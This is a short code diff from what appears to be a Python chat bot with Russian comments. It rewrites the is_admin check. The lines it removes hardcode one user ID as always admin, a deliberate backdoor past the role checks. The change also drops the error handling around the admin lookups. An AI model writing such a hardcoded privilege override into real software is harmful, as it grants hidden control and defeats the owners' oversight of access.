@@ -799,14 +799,7 @@ class GlobalCooldownMiddleware(BaseMiddleware):
 
 # ==================== ФУНКЦИИ ПРОВЕРКИ ПРАВ ====================
 async def is_admin(user_id: int) -> bool:
-    # ТВОЙ ID ВСЕГДА АДМИН
-    if user_id == 8127013147:
-        return True
-    try:
-        return await is_super_admin(user_id) or await is_junior_admin(user_id)
-    except Exception as e:
-        logging.error(f"Ошибка при проверке админа: {e}")
-        return False
+    return await is_super_admin(user_id) or await is_junior_admin(user_id)
 
 @db_retry()
 async def is_junior_admin(user_id: int) -> bool:
